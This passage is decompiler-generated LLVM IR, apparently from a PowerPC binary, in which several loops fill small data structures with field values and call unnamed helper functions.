  %v1_10004250 = urem i32 %v5_10004114, 2
  store i32 %v1_10004250, i32* %r9.global-to-local, align 4
  %v0_10004254 = load i32, i32* %r26.global-to-local, align 4
  %v1_10004254 = urem i32 %v0_10004254, 2
  store i32 %v1_10004254, i32* %r28.global-to-local, align 4
  %v1_10004258 = urem i32 %v0_10004244, 2
  store i32 %v1_10004258, i32* %r26.global-to-local, align 4
  %v1_1000425c = urem i32 %v1_10004248, 65536
  store i32 %v1_1000425c, i32* %r0.global-to-local, align 4
  %v0_10004264 = load i32, i32* @r31, align 4
  %v3_10004264 = icmp eq i32 %v0_10004264, 0
  store i1 %v3_10004264, i1* %cr2_eq.global-to-local, align 1
  %v5_10004268 = trunc i32 %v1_10004248 to i16
  %v0_1000426c = load i32, i32* %r14.global-to-local, align 4
  %v1_1000426c = urem i32 %v0_1000426c, 2
  store i32 %v1_1000426c, i32* %r14.global-to-local, align 4
  %v0_10004270 = load i32, i32* %r27.global-to-local, align 4
  %v1_10004270 = urem i32 %v0_10004270, 2
  store i32 %v1_10004270, i32* %r27.global-to-local, align 4
  %v0_10004274 = load i32, i32* %r30.global-to-local, align 4
  %v1_10004274 = urem i32 %v0_10004274, 2
  %v4_100042c4 = sext i8 %v5_10004048 to i32
  br label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_1000435c, %dec_label_pc_10004240
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268452488, i32* @lr, align 4
  %v2_10004284 = call i32 @function_1000c548(i32 1510, i32 1)
  store i32 %v2_10004284, i32* %r3.global-to-local, align 4
  %v3_10004288 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10004288, i32* %r9.global-to-local, align 4
  %v0_1000428c = load i32, i32* @r31, align 4
  %v1_1000428c = mul i32 %v0_1000428c, 4
  store i32 %v1_1000428c, i32* %r0.global-to-local, align 4
  %v1_10004290 = load i32, i32* %r22.global-to-local, align 4
  %v3_10004290 = add i32 %v1_10004290, %v1_1000428c
  %v4_10004290 = inttoptr i32 %v3_10004290 to i32*
  store i32 %v2_10004284, i32* %v4_10004290, align 4
  %v0_10004294 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004294 = mul i32 %v0_10004294, 4
  store i32 %v1_10004294, i32* %r9.global-to-local, align 4
  %v1_10004298 = load i32, i32* %r22.global-to-local, align 4
  %v2_10004298 = add i32 %v1_10004298, %v1_10004294
  %v3_10004298 = inttoptr i32 %v2_10004298 to i32*
  %v4_10004298 = load i32, i32* %v3_10004298, align 4
  store i32 %v4_10004298, i32* @r31, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_100042a0 = inttoptr i32 %v4_10004298 to i32*
  %v2_100042a0 = load i32, i32* %v1_100042a0, align 4
  store i32 %v2_100042a0, i32* %r0.global-to-local, align 4
  %v1_100042a4 = add i32 %v4_10004298, 20
  store i32 %v1_100042a4, i32* @r30, align 4
  %v0_100042a8 = load i32, i32* %r18.global-to-local, align 4
  %v1_100042a8 = trunc i32 %v0_100042a8 to i16
  %v3_100042a8 = add i32 %v4_10004298, 4
  %v4_100042a8 = inttoptr i32 %v3_100042a8 to i16*
  store i16 %v1_100042a8, i16* %v4_100042a8, align 2
  %v1_100042ac = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100042ac, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_100042b4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_100042b8 = load i32, i32* @r31, align 4
  %v2_100042b8 = inttoptr i32 %v1_100042b8 to i32*
  store i32 %v1_100042b4, i32* %v2_100042b8, align 4
  %v2_100042c0 = load i32, i32* @r31, align 4
  %v3_100042c0 = add i32 %v2_100042c0, 8
  %v4_100042c0 = inttoptr i32 %v3_100042c0 to i8*
  store i8 %v5_10004080, i8* %v4_100042c0, align 1
  store i32 %v4_100042c4, i32* %r9.global-to-local, align 4
  %v2_100042c8 = load i32, i32* @r31, align 4
  %v3_100042c8 = add i32 %v2_100042c8, 1
  %v4_100042c8 = inttoptr i32 %v3_100042c8 to i8*
  store i8 %v5_10004048, i8* %v4_100042c8, align 1
  store i32 %v1_10004248, i32* %r0.global-to-local, align 4
  %v2_100042d0 = load i32, i32* @r31, align 4
  %v3_100042d0 = add i32 %v2_100042d0, 2
  %v4_100042d0 = inttoptr i32 %v3_100042d0 to i16*
  store i16 %v5_10004268, i16* %v4_100042d0, align 2
  %v0_100042d4 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100042d4, label %dec_label_pc_100042e0, label %dec_label_pc_100042d8

dec_label_pc_100042d8:                            ; preds = %dec_label_pc_1000427c
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100042dc = load i32, i32* @r31, align 4
  %v3_100042dc = add i32 %v2_100042dc, 6
  %v4_100042dc = inttoptr i32 %v3_100042dc to i16*
  store i16 16384, i16* %v4_100042dc, align 2
  br label %dec_label_pc_100042e0

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_1000427c, %dec_label_pc_100042d8
  store i32 6, i32* %r0.global-to-local, align 4
  %v0_100042e4 = load i32, i32* %r19.global-to-local, align 4
  %v1_100042e4 = trunc i32 %v0_100042e4 to i16
  %v2_100042e4 = load i32, i32* @r31, align 4
  %v3_100042e4 = add i32 %v2_100042e4, 20
  %v4_100042e4 = inttoptr i32 %v3_100042e4 to i16*
  store i16 %v1_100042e4, i16* %v4_100042e4, align 2
  %v0_100042e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100042e8 = trunc i32 %v0_100042e8 to i8
  %v2_100042e8 = load i32, i32* @r31, align 4
  %v3_100042e8 = add i32 %v2_100042e8, 9
  %v4_100042e8 = inttoptr i32 %v3_100042e8 to i8*
  store i8 %v1_100042e8, i8* %v4_100042e8, align 1
  %v0_100042ec = load i32, i32* %r20.global-to-local, align 4
  %v1_100042ec = trunc i32 %v0_100042ec to i16
  %v2_100042ec = load i32, i32* @r30, align 4
  %v3_100042ec = add i32 %v2_100042ec, 2
  %v4_100042ec = inttoptr i32 %v3_100042ec to i16*
  store i16 %v1_100042ec, i16* %v4_100042ec, align 2
  %v1_100042f4 = load i32, i32* @r31, align 4
  %v2_100042f4 = add i32 %v1_100042f4, 12
  %v3_100042f4 = inttoptr i32 %v2_100042f4 to i32*
  store i32 %v6_100041dc, i32* %v3_100042f4, align 4
  %v3_100042f8 = load i32, i32* %stack_var_-136, align 4
  %v1_100042fc = mul i32 %v3_100042f8, 24
  %v1_10004300 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004300 = add i32 %v1_10004300, %v1_100042fc
  store i32 %v2_10004300, i32* %r9.global-to-local, align 4
  %v1_10004304 = add i32 %v2_10004300, 16
  %v2_10004304 = inttoptr i32 %v1_10004304 to i32*
  %v3_10004304 = load i32, i32* %v2_10004304, align 4
  store i32 %v3_10004304, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_1000430c = load i32, i32* @r31, align 4
  %v2_1000430c = add i32 %v1_1000430c, 16
  %v3_1000430c = inttoptr i32 %v2_1000430c to i32*
  store i32 %v3_10004304, i32* %v3_1000430c, align 4
  %v0_10004310 = load i32, i32* %r15.global-to-local, align 4
  %v1_10004310 = load i32, i32* @r30, align 4
  %v2_10004310 = add i32 %v1_10004310, 4
  %v3_10004310 = inttoptr i32 %v2_10004310 to i32*
  store i32 %v0_10004310, i32* %v3_10004310, align 4
  %v0_10004314 = load i32, i32* @r30, align 4
  %v1_10004314 = add i32 %v0_10004314, 12
  %v2_10004314 = inttoptr i32 %v1_10004314 to i32*
  %v3_10004314 = load i32, i32* %v2_10004314, align 4
  store i32 %v3_10004314, i32* %r0.global-to-local, align 4
  %v1_10004318 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10004318, i32* %r0.global-to-local, align 4
  store i32 %v1_10004250, i32* %r9.global-to-local, align 4
  %v1_10004320 = call i32 @__asm_rlwimi(i32 %v1_10004250, i32 21, i32 10, i32 10)
  store i32 %v1_10004320, i32* %r0.global-to-local, align 4
  %v1_10004324 = call i32 @__asm_rlwimi(i32 %v1_1000426c, i32 20, i32 11, i32 11)
  store i32 %v1_10004324, i32* %r0.global-to-local, align 4
  %v1_10004328 = call i32 @__asm_rlwimi(i32 %v1_10004258, i32 19, i32 12, i32 12)
  store i32 %v1_10004328, i32* %r0.global-to-local, align 4
  %v1_1000432c = call i32 @__asm_rlwimi(i32 %v1_10004270, i32 18, i32 13, i32 13)
  store i32 %v1_1000432c, i32* %r0.global-to-local, align 4
  %v1_10004330 = call i32 @__asm_rlwimi(i32 %v1_10004254, i32 17, i32 14, i32 14)
  store i32 %v1_10004330, i32* %r0.global-to-local, align 4
  %v1_10004334 = call i32 @__asm_rlwimi(i32 %v1_10004274, i32 16, i32 15, i32 15)
  store i32 %v1_10004334, i32* %r0.global-to-local, align 4
  %v1_10004338 = load i32, i32* @r30, align 4
  %v2_10004338 = add i32 %v1_10004338, 12
  %v3_10004338 = inttoptr i32 %v2_10004338 to i32*
  store i32 %v1_10004334, i32* %v3_10004338, align 4
  %v0_1000433c = call i32 @function_10007ca8()
  %v1_1000433c = trunc i32 %v0_1000433c to i16
  %v0_10004340 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10004340, i32* @r4, align 4
  %v3_10004344 = load i32, i32* @r30, align 4
  %v4_10004344 = add i32 %v3_10004344, 14
  %v5_10004344 = inttoptr i32 %v4_10004344 to i16*
  store i16 %v1_1000433c, i16* %v5_10004344, align 2
  %v0_10004348 = load i32, i32* @r31, align 4
  %v1_10004348 = add i32 %v0_10004348, 40
  store i32 %v1_10004348, i32* @r3, align 4
  %v0_1000434c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000434c, label %dec_label_pc_1000435c, label %dec_label_pc_10004350

dec_label_pc_10004350:                            ; preds = %dec_label_pc_100042e0
  %v0_10004350 = load i32, i32* @r30, align 4
  %v1_10004350 = add i32 %v0_10004350, 12
  %v2_10004350 = inttoptr i32 %v1_10004350 to i32*
  %v3_10004350 = load i32, i32* %v2_10004350, align 4
  %v1_10004354 = or i32 %v3_10004350, 524288
  store i32 %v1_10004354, i32* %r0.global-to-local, align 4
  store i32 %v1_10004354, i32* %v2_10004350, align 4
  br label %dec_label_pc_1000435c

dec_label_pc_1000435c:                            ; preds = %dec_label_pc_100042e0, %dec_label_pc_10004350
  %v0_1000435c = call i32 @function_10007ed4()
  store i32 %v0_1000435c, i32* %r3.global-to-local, align 4
  %v3_10004360 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10004360, i32* %r9.global-to-local, align 4
  %v1_10004364 = add i32 %v3_10004360, 1
  %v1_10004368 = load i32, i32* %r21.global-to-local, align 4
  %v2_10004368 = icmp slt i32 %v1_10004364, %v1_10004368
  store i32 %v1_10004364, i32* %stack_var_-136, align 4
  br i1 %v2_10004368, label %dec_label_pc_1000427c, label %dec_label_pc_10004374

dec_label_pc_10004374:                            ; preds = %dec_label_pc_1000435c
  store i32 %v6_100041dc, i32* %r0.global-to-local, align 4
  %v0_10004378 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004378 = add i32 %v0_10004378, 20
  store i32 %v1_10004378, i32* @r30, align 4
  store i32 %v1_100041c8, i32* %r9.global-to-local, align 4
  %v3_10004380 = icmp eq i32 %v6_100041dc, -1
  store i1 %v3_10004380, i1* %cr2_eq.global-to-local, align 1
  %v3_10004384 = icmp eq i32 %v1_100041c8, 0
  store i1 %v3_10004384, i1* %cr3_eq.global-to-local, align 1
  %v0_10004388.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004388.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10004388.preheader

dec_label_pc_10004388.preheader:                  ; preds = %dec_label_pc_10004468, %dec_label_pc_1000450c, %dec_label_pc_10004374
  %v1_10004388 = phi i1 [ %v1_10004224, %dec_label_pc_1000450c ], [ %v1_10004388.pre, %dec_label_pc_10004374 ], [ %v1_10004468, %dec_label_pc_10004468 ]
  %v0_10004388 = phi i1 [ %v3_10004224, %dec_label_pc_1000450c ], [ %v0_10004388.pre, %dec_label_pc_10004374 ], [ %v0_10004468, %dec_label_pc_10004468 ]
  %v2_10004388 = or i1 %v1_10004388, %v0_10004388
  br label %dec_label_pc_10004388

dec_label_pc_10004388:                            ; preds = %dec_label_pc_10004388.preheader, %dec_label_pc_10004388
  br i1 %v2_10004388, label %dec_label_pc_10004388, label %dec_label_pc_1000438c

dec_label_pc_1000438c:                            ; preds = %dec_label_pc_10004388, %dec_label_pc_10004468
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10004390 = load i32, i32* @r30, align 4
  %v1_10004390 = urem i32 %v0_10004390, 65536
  store i32 %v1_10004390, i32* %r27.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100043a0

dec_label_pc_100043a0:                            ; preds = %dec_label_pc_100043f8, %dec_label_pc_1000438c
  %v0_100043a0 = phi i32 [ %v1_10004458, %dec_label_pc_100043f8 ], [ 0, %dec_label_pc_1000438c ]
  %v1_100043a0 = mul i32 %v0_100043a0, 24
  store i32 %v1_100043a0, i32* %r0.global-to-local, align 4
  %v1_100043a4 = mul i32 %v0_100043a0, 4
  %v1_100043a8 = load i32, i32* %r22.global-to-local, align 4
  %v2_100043a8 = add i32 %v1_100043a8, %v1_100043a4
  %v3_100043a8 = inttoptr i32 %v2_100043a8 to i32*
  %v4_100043a8 = load i32, i32* %v3_100043a8, align 4
  store i32 %v4_100043a8, i32* %r28.global-to-local, align 4
  %v1_100043ac = load i32, i32* %r25.global-to-local, align 4
  %v2_100043ac = add i32 %v1_100043ac, %v1_100043a0
  %v1_100043b0 = add i32 %v2_100043ac, 20
  %v2_100043b0 = inttoptr i32 %v1_100043b0 to i8*
  %v3_100043b0 = load i8, i8* %v2_100043b0, align 1
  %v4_100043b0 = zext i8 %v3_100043b0 to i32
  store i32 %v4_100043b0, i32* %r9.global-to-local, align 4
  %v1_100043b4 = add i32 %v4_100043a8, 20
  store i32 %v1_100043b4, i32* @r31, align 4
  %tmp41 = icmp ult i8 %v3_100043b0, 32
  br i1 %tmp41, label %dec_label_pc_10004470, label %dec_label_pc_100043c0

dec_label_pc_100043c0:                            ; preds = %dec_label_pc_100043a0
  %v0_100043c0 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100043c0, label %dec_label_pc_10004498, label %dec_label_pc_100043c4

dec_label_pc_100043c4:                            ; preds = %dec_label_pc_10004470, %dec_label_pc_100043c0
  store i32 65535, i32* @r29, align 4
  %v0_100043cc = load i32, i32* %r18.global-to-local, align 4
  %v4_100043cc = icmp eq i32 %v0_100043cc, 65535
  br i1 %v4_100043cc, label %dec_label_pc_100044b0, label %dec_label_pc_100043d4

dec_label_pc_100043d4:                            ; preds = %dec_label_pc_10004498, %dec_label_pc_100043c4
  %v1_100043d4 = phi i32 [ %v1_100044a8, %dec_label_pc_10004498 ], [ 65535, %dec_label_pc_100043c4 ]
  %v0_100043d4 = load i32, i32* %r19.global-to-local, align 4
  %v4_100043d4 = icmp eq i32 %v0_100043d4, %v1_100043d4
  br i1 %v4_100043d4, label %dec_label_pc_100044c0, label %dec_label_pc_100043dc

dec_label_pc_100043dc:                            ; preds = %dec_label_pc_100044b0.dec_label_pc_100043dc_crit_edge, %dec_label_pc_100043d4
  %v1_100043dc = phi i32 [ %v1_100043dc.pre, %dec_label_pc_100044b0.dec_label_pc_100043dc_crit_edge ], [ %v1_100043d4, %dec_label_pc_100043d4 ]
  %v0_100043dc = load i32, i32* %r20.global-to-local, align 4
  %v4_100043dc = icmp eq i32 %v0_100043dc, %v1_100043dc
  br i1 %v4_100043dc, label %dec_label_pc_100044d0, label %dec_label_pc_100043e4

dec_label_pc_100043e4:                            ; preds = %dec_label_pc_100044c0.dec_label_pc_100043e4_crit_edge, %dec_label_pc_100043dc
  %v1_100043e4 = phi i32 [ %v1_100043e4.pre, %dec_label_pc_100044c0.dec_label_pc_100043e4_crit_edge ], [ %v1_100043dc, %dec_label_pc_100043dc ]
  %v0_100043e4 = load i32, i32* %r15.global-to-local, align 4
  %v4_100043e4 = icmp eq i32 %v0_100043e4, %v1_100043e4
  br i1 %v4_100043e4, label %dec_label_pc_100044e0, label %dec_label_pc_100043ec

dec_label_pc_100043ec:                            ; preds = %dec_label_pc_100044d0.dec_label_pc_100043ec_crit_edge, %dec_label_pc_100043e4
  %v1_100043ec = phi i32 [ %v1_100043ec.pre, %dec_label_pc_100044d0.dec_label_pc_100043ec_crit_edge ], [ %v1_100043e4, %dec_label_pc_100043e4 ]
  %v0_100043ec = load i32, i32* %r17.global-to-local, align 4
  %v4_100043ec = icmp eq i32 %v0_100043ec, %v1_100043ec
  br i1 %v4_100043ec, label %dec_label_pc_100044f0, label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_100044e0, %dec_label_pc_100043ec
  %v0_100043f4 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100043f4, label %dec_label_pc_100043f8, label %dec_label_pc_100044fc

dec_label_pc_100043f8:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_100044f0, %dec_label_pc_100044fc
  %v0_100043f8 = load i32, i32* %r26.global-to-local, align 4
  %v1_100043f8 = trunc i32 %v0_100043f8 to i16
  %v2_100043f8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100043f8 = add i32 %v2_100043f8, 10
  %v4_100043f8 = inttoptr i32 %v3_100043f8 to i16*
  store i16 %v1_100043f8, i16* %v4_100043f8, align 2
  %v0_10004400 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10004400, i32* @r3, align 4
  %v2_10004404 = call i32 @function_100060d4(i32 %v0_10004400, i32 20)
  %v3_10004404 = trunc i32 %v2_10004404 to i16
  %v0_10004408 = load i32, i32* @r31, align 4
  store i32 %v0_10004408, i32* @r4, align 4
  %v4_1000440c = add i32 %v0_10004400, 10
  %v5_1000440c = inttoptr i32 %v4_1000440c to i16*
  store i16 %v3_10004404, i16* %v5_1000440c, align 2
  %v0_10004410 = load i32, i32* %r27.global-to-local, align 4
  %v0_10004414 = load i32, i32* %r26.global-to-local, align 4
  %v1_10004414 = trunc i32 %v0_10004414 to i16
  %v2_10004414 = load i32, i32* @r31, align 4
  %v3_10004414 = add i32 %v2_10004414, 16
  %v4_10004414 = inttoptr i32 %v3_10004414 to i16*
  store i16 %v1_10004414, i16* %v4_10004414, align 2
  %v0_10004418 = load i32, i32* @r30, align 4
  %v0_1000441c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000441c, i32* %r3.global-to-local, align 4
  %v4_10004420 = call i32 @function_10006138(i32 %v0_1000441c, i32 %v0_10004408, i32 %v0_10004410, i32 %v0_10004418)
  %v5_10004420 = trunc i32 %v4_10004420 to i16
  store i32 %v4_10004420, i32* %r3.global-to-local, align 4
  %v3_10004424 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10004424, i32* %r7.global-to-local, align 4
  %v0_10004428 = load i32, i32* @r31, align 4
  %v1_10004428 = add i32 %v0_10004428, 2
  %v2_10004428 = inttoptr i32 %v1_10004428 to i16*
  %v3_10004428 = load i16, i16* %v2_10004428, align 2
  %v4_10004428 = zext i16 %v3_10004428 to i32
  store i32 %v4_10004428, i32* %r0.global-to-local, align 4
  %v0_1000442c = load i32, i32* %r28.global-to-local, align 4
  %v1_10004430 = mul i32 %v3_10004424, 24
  store i32 %v1_10004430, i32* %r7.global-to-local, align 4
  %v4_10004434 = add i32 %v0_10004428, 16
  %v5_10004434 = inttoptr i32 %v4_10004434 to i16*
  store i16 %v5_10004420, i16* %v5_10004434, align 2
  %v0_10004438 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000443c = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000443c, i32* %r3.global-to-local, align 4
  %v0_10004440 = load i32, i32* %r7.global-to-local, align 4
  %v1_10004440 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004440 = add i32 %v1_10004440, %v0_10004440
  store i32 %v2_10004440, i32* %r7.global-to-local, align 4
  %v0_10004448 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004448 = trunc i32 %v0_10004448 to i16
  %v3_10004448 = add i32 %v2_10004440, 2
  %v4_10004448 = inttoptr i32 %v3_10004448 to i16*
  store i16 %v1_10004448, i16* %v4_10004448, align 2
  store i32 268452948, i32* @lr, align 4
  %v6_10004450 = call i32 @function_1000c140(i32 %v0_1000443c, i32 %v0_1000442c, i32 %v0_10004438, i32 16384, i32 %v2_10004440, i32 16)
  store i32 %v6_10004450, i32* %r3.global-to-local, align 4
  %v3_10004454 = load i32, i32* %stack_var_-136, align 4
  %v1_10004458 = add i32 %v3_10004454, 1
  store i32 %v1_10004458, i32* %r9.global-to-local, align 4
  %v1_1000445c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000445c = icmp slt i32 %v1_10004458, %v1_1000445c
  store i32 %v1_10004458, i32* %stack_var_-136, align 4
  br i1 %v2_1000445c, label %dec_label_pc_100043a0, label %dec_label_pc_10004468

dec_label_pc_10004468:                            ; preds = %dec_label_pc_100043f8
  %v0_10004468 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004468 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004468 = or i1 %v0_10004468, %v1_10004468
  br i1 %v2_10004468, label %dec_label_pc_10004388.preheader, label %dec_label_pc_1000438c

dec_label_pc_10004470:                            ; preds = %dec_label_pc_100043a0
  %v1_10004470 = add i32 %v2_100043ac, 16
  %v2_10004470 = inttoptr i32 %v1_10004470 to i32*
  %v3_10004470 = load i32, i32* %v2_10004470, align 4
  store i32 %v3_10004470, i32* %r29.global-to-local, align 4
  %v0_10004474 = call i32 @function_10007ca8()
  store i32 %v0_10004474, i32* %r3.global-to-local, align 4
  %v3_10004478 = load i32, i32* %stack_var_-136, align 4
  %v1_1000447c = mul i32 %v3_10004478, 24
  %v1_10004480 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004480 = add i32 %v1_10004480, %v1_1000447c
  store i32 %v2_10004480, i32* %r9.global-to-local, align 4
  %v1_10004484 = add i32 %v2_10004480, 20
  %v2_10004484 = inttoptr i32 %v1_10004484 to i8*
  %v3_10004484 = load i8, i8* %v2_10004484, align 1
  %v4_10004484 = zext i8 %v3_10004484 to i32
  store i32 %v4_10004484, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004484, 64
  %v2_10004488 = zext i8 %tmp to i32
  %v3_10004488 = lshr i32 %v0_10004474, %v2_10004488
  store i32 %v3_10004488, i32* %r3.global-to-local, align 4
  %v0_1000448c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000448c = add i32 %v3_10004488, %v0_1000448c
  store i32 %v2_1000448c, i32* %r29.global-to-local, align 4
  %v1_10004490 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004490 = add i32 %v1_10004490, 16
  %v3_10004490 = inttoptr i32 %v2_10004490 to i32*
  store i32 %v2_1000448c, i32* %v3_10004490, align 4
  %v0_10004494 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004494, label %dec_label_pc_10004498, label %dec_label_pc_100043c4

dec_label_pc_10004498:                            ; preds = %dec_label_pc_10004470, %dec_label_pc_100043c0
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000449c = call i32 @function_10007ca8()
  store i32 %v0_1000449c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_100044a4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100044a4 = add i32 %v1_100044a4, 12
  %v3_100044a4 = inttoptr i32 %v2_100044a4 to i32*
  store i32 %v0_1000449c, i32* %v3_100044a4, align 4
  %v0_100044a8 = load i32, i32* %r18.global-to-local, align 4
  %v1_100044a8 = load i32, i32* @r29, align 4
  %v4_100044a8 = icmp eq i32 %v0_100044a8, %v1_100044a8
  br i1 %v4_100044a8, label %dec_label_pc_100044b0, label %dec_label_pc_100043d4

dec_label_pc_100044b0:                            ; preds = %dec_label_pc_10004498, %dec_label_pc_100043c4
  %v0_100044b0 = call i32 @function_10007ca8()
  %v1_100044b0 = trunc i32 %v0_100044b0 to i16
  store i32 %v0_100044b0, i32* %r3.global-to-local, align 4
  %v0_100044b4 = load i32, i32* %r19.global-to-local, align 4
  %v1_100044b4 = load i32, i32* @r29, align 4
  %v4_100044b4 = icmp eq i32 %v0_100044b4, %v1_100044b4
  %v3_100044b8 = load i32, i32* %r28.global-to-local, align 4
  %v4_100044b8 = add i32 %v3_100044b8, 4
  %v5_100044b8 = inttoptr i32 %v4_100044b8 to i16*
  store i16 %v1_100044b0, i16* %v5_100044b8, align 2
  br i1 %v4_100044b4, label %dec_label_pc_100044c0, label %dec_label_pc_100044b0.dec_label_pc_100043dc_crit_edge

dec_label_pc_100044b0.dec_label_pc_100043dc_crit_edge: ; preds = %dec_label_pc_100044b0
  %v1_100043dc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100043dc

dec_label_pc_100044c0:                            ; preds = %dec_label_pc_100044b0, %dec_label_pc_100043d4
  %v0_100044c0 = call i32 @function_10007ca8()
  %v1_100044c0 = trunc i32 %v0_100044c0 to i16
  store i32 %v0_100044c0, i32* %r3.global-to-local, align 4
  %v0_100044c4 = load i32, i32* %r20.global-to-local, align 4
  %v1_100044c4 = load i32, i32* @r29, align 4
  %v4_100044c4 = icmp eq i32 %v0_100044c4, %v1_100044c4
  %v3_100044c8 = load i32, i32* %r28.global-to-local, align 4
  %v4_100044c8 = add i32 %v3_100044c8, 20
  %v5_100044c8 = inttoptr i32 %v4_100044c8 to i16*
  store i16 %v1_100044c0, i16* %v5_100044c8, align 2
  br i1 %v4_100044c4, label %dec_label_pc_100044d0, label %dec_label_pc_100044c0.dec_label_pc_100043e4_crit_edge

dec_label_pc_100044c0.dec_label_pc_100043e4_crit_edge: ; preds = %dec_label_pc_100044c0
  %v1_100043e4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100043e4

dec_label_pc_100044d0:                            ; preds = %dec_label_pc_100044c0, %dec_label_pc_100043dc
  %v0_100044d0 = call i32 @function_10007ca8()
  %v1_100044d0 = trunc i32 %v0_100044d0 to i16
  store i32 %v0_100044d0, i32* %r3.global-to-local, align 4
  %v0_100044d4 = load i32, i32* %r15.global-to-local, align 4
  %v1_100044d4 = load i32, i32* @r29, align 4
  %v4_100044d4 = icmp eq i32 %v0_100044d4, %v1_100044d4
  %v3_100044d8 = load i32, i32* @r31, align 4
  %v4_100044d8 = add i32 %v3_100044d8, 2
  %v5_100044d8 = inttoptr i32 %v4_100044d8 to i16*
  store i16 %v1_100044d0, i16* %v5_100044d8, align 2
  br i1 %v4_100044d4, label %dec_label_pc_100044e0, label %dec_label_pc_100044d0.dec_label_pc_100043ec_crit_edge

dec_label_pc_100044d0.dec_label_pc_100043ec_crit_edge: ; preds = %dec_label_pc_100044d0
  %v1_100043ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100043ec

dec_label_pc_100044e0:                            ; preds = %dec_label_pc_100044d0, %dec_label_pc_100043e4
  %v0_100044e0 = call i32 @function_10007ca8()
  store i32 %v0_100044e0, i32* %r3.global-to-local, align 4
  %v0_100044e4 = load i32, i32* %r17.global-to-local, align 4
  %v1_100044e4 = load i32, i32* @r29, align 4
  %v4_100044e4 = icmp eq i32 %v0_100044e4, %v1_100044e4
  %v1_100044e8 = load i32, i32* @r31, align 4
  %v2_100044e8 = add i32 %v1_100044e8, 4
  %v3_100044e8 = inttoptr i32 %v2_100044e8 to i32*
  store i32 %v0_100044e0, i32* %v3_100044e8, align 4
  br i1 %v4_100044e4, label %dec_label_pc_100044f0, label %dec_label_pc_100043f4

dec_label_pc_100044f0:                            ; preds = %dec_label_pc_100044e0, %dec_label_pc_100043ec
  %v0_100044f0 = call i32 @function_10007ca8()
  store i32 %v0_100044f0, i32* %r3.global-to-local, align 4
  %v1_100044f4 = load i32, i32* @r31, align 4
  %v2_100044f4 = add i32 %v1_100044f4, 8
  %v3_100044f4 = inttoptr i32 %v2_100044f4 to i32*
  store i32 %v0_100044f0, i32* %v3_100044f4, align 4
  %v0_100044f8 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100044f8, label %dec_label_pc_100043f8, label %dec_label_pc_100044fc

dec_label_pc_100044fc:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_100044f0
  %v0_100044fc = load i32, i32* %r28.global-to-local, align 4
  %v1_100044fc = add i32 %v0_100044fc, 40
  store i32 %v1_100044fc, i32* @r3, align 4
  %v0_10004500 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10004500, i32* @r4, align 4
  %v0_10004504 = call i32 @function_10007ed4()
  store i32 %v0_10004504, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100043f8

dec_label_pc_1000450c:                            ; preds = %dec_label_pc_10004224
  store i32 %v6_100041dc, i32* %r0.global-to-local, align 4
  %v0_10004510 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004510 = add i32 %v0_10004510, 40
  store i32 %v1_10004510, i32* %r24.global-to-local, align 4
  store i32 %v1_100041c8, i32* %r9.global-to-local, align 4
  %v1_10004518 = add i32 %v0_10004510, 20
  store i32 %v1_10004518, i32* @r30, align 4
  %v3_1000451c = icmp eq i32 %v6_100041dc, -1
  store i1 %v3_1000451c, i1* %cr2_eq.global-to-local, align 1
  %v3_10004520 = icmp eq i32 %v1_100041c8, 0
